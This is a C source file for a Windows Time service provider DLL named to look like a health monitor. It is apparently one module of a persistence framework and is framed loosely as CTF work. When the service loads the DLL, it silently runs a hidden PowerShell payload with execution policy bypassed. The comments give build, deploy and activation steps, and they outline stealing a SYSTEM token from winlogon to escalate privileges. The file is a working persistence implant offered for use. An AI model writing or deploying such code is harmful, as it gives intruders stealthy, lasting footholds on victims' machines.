/*
 * SvcHealthMonTimeProv.c — W32Time Time Provider DLL
 * Mechanism 10: loaded by the Windows Time service (W32Time / svchost.exe)
 * at startup. Runs as LocalService context.
 *
 * BUILD (MSVC, from a Developer Command Prompt):
 *   cl /LD /O2 SvcHealthMonTimeProv.c /link kernel32.lib
 *   (No .def file needed — __declspec(dllexport) handles it)
 *
 * BUILD (MinGW/w64devkit):
 *   gcc -shared -O2 -o SvcHealthMonTimeProv.dll SvcHealthMonTimeProv.c -lkernel32
 *
 * DEPLOY:
 *   copy SvcHealthMonTimeProv.dll "C:\ProgramData\SvcHealthMonitor\"
 *   (Registry entry already added by Invoke-PersistenceFramework.ps1 -Install)
 *
 * ACTIVATE (no reboot needed — just restart W32Time):
 *   net stop w32time && net start w32time
 *   -- OR just reboot, W32Time starts automatically.
 *
 * VERIFY:
 *   net start w32time
 *   Then check C:\ProgramData\SvcHealthMonitor\keepalive.log —
 *   a new entry should appear within a few seconds of the service starting.
 *
 * NOTE ON PRIVILEGES:
 *   W32Time runs as NT AUTHORITY\LocalService. This is enough to:
 *     - Start/stop services (with SeServiceLogonRight)
 *     - Write to ProgramData
 *     - Spawn processes
 *   It cannot write to HKLM registry or modify other accounts without
 *   token impersonation. If you need SYSTEM-level, see the impersonation
 *   note in TimeProvOpen below.
 */

#include <windows.h>

/* ── Change this path if you move keepalive.ps1 ─────────────────────────── */
#define PAYLOAD_CMD \
    L"powershell.exe -NonInteractive -WindowStyle Hidden " \
    L"-ExecutionPolicy Bypass -File " \
    L"\"C:\\ProgramData\\SvcHealthMonitor\\keepalive.ps1\""

/*
 * W32Time provider types — normally defined in timeprov.h (Windows SDK).
 * We redefine the minimum here so you don't need the full SDK installed.
 * If you have the SDK, replace these with: #include <timeprov.h>
 */
typedef HANDLE TimeProvHandle;
typedef DWORD  TimeSysFlags;
typedef DWORD  TimeProvCmd;
typedef void*  TimeProvSysCallbacks;


/* ── Internal helper ─────────────────────────────────────────────────────── */
static void SpawnPayload(void)
{
    STARTUPINFOW        si  = { sizeof(si) };
    PROCESS_INFORMATION pi  = { 0 };
    WCHAR cmd[] = PAYLOAD_CMD;

    /*
     * NOTE ON SYSTEM-LEVEL EXECUTION:
     * If you need the payload to run as SYSTEM rather than LocalService,
     * you can impersonate a SYSTEM token before calling CreateProcess.
     * The simplest approach in a CTF context:
     *
     *   HANDLE hToken;
     *   // Find a SYSTEM process (e.g., winlogon.exe) and duplicate its token
     *   OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
     *   // ... duplicate and impersonate ...
     *   CreateProcessWithTokenW(hSystemToken, ...);
     *
     * For most CTF purposes, LocalService is sufficient — it can start
     * TermService, write to ProgramData, and run PowerShell.
     */

    CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        DETACHED_PROCESS | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
}


/* ── Required export 1 ───────────────────────────────────────────────────
 * TimeProvOpen
 *   Called by W32Time when it loads the provider DLL.
 *   Must return a non-NULL handle (used as an opaque identifier in
 *   subsequent TimeProvCommand / TimeProvClose calls).
 *   Returning NULL signals failure and W32Time will unload the DLL.
 *
 *   Parameters:
 *     wszName         — registry name of this provider ("SvcHealthMonTimeProv")
 *     pSysCallbacks   — pointer to W32Time's internal callback table (we ignore)
 *     dwFlags         — provider flags (we ignore)
 */
__declspec(dllexport)
TimeProvHandle WINAPI TimeProvOpen(
    WCHAR*                wszName,
    TimeProvSysCallbacks* pSysCallbacks,
    TimeSysFlags          dwFlags)
{
    (void)wszName;
    (void)pSysCallbacks;
    (void)dwFlags;

    SpawnPayload();

    /*
     * Return any non-NULL value as the handle.
     * W32Time passes this back to TimeProvCommand and TimeProvClose.
     * We just use 1 — we don't actually need to track state.
     */
    return (TimeProvHandle)1;
}


/* ── Required export 2 ───────────────────────────────────────────────────
 * TimeProvCommand
 *   Called by W32Time to send control messages to the provider —
 *   for example, to request a time sample, alert it of a system event,
 *   or signal it to stop. We ignore all commands and return success.
 *
 *   Returning a non-zero value here would be treated as an error by W32Time
 *   and might cause it to log warnings in Event Viewer, so we return 0.
 *
 *   Parameters:
 *     hTimeProv — our handle from TimeProvOpen
 *     eCmd      — command identifier (we don't need to enumerate these)
 *     pvData    — command-specific data (varies by eCmd, we ignore it)
 */
__declspec(dllexport)
DWORD WINAPI TimeProvCommand(
    TimeProvHandle hTimeProv,
    TimeProvCmd    eCmd,
    void*          pvData)
{
    (void)hTimeProv;
    (void)eCmd;
    (void)pvData;
    return 0;   /* ERROR_SUCCESS */
}


/* ── Required export 3 ───────────────────────────────────────────────────
 * TimeProvClose
 *   Called by W32Time when it is unloading the provider — typically on
 *   service shutdown. We clean up nothing (no state to release) and
 *   return success.
 *
 *   Parameters:
 *     hTimeProv — our handle from TimeProvOpen
 */
__declspec(dllexport)
DWORD WINAPI TimeProvClose(TimeProvHandle hTimeProv)
{
    (void)hTimeProv;
    return 0;   /* ERROR_SUCCESS */
}


/* ── DllMain ─────────────────────────────────────────────────────────────
 * We intentionally do nothing in DllMain.
 * Doing heavy work in DllMain (like spawning processes) is unsafe —
 * the loader lock is held and many Win32 calls are forbidden.
 * All work goes in TimeProvOpen which is called after the DLL is
 * fully loaded and the loader lock is released.
 */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved)
{
    (void)hModule;
    (void)ul_reason;
    (void)lpReserved;
    return TRUE;
}
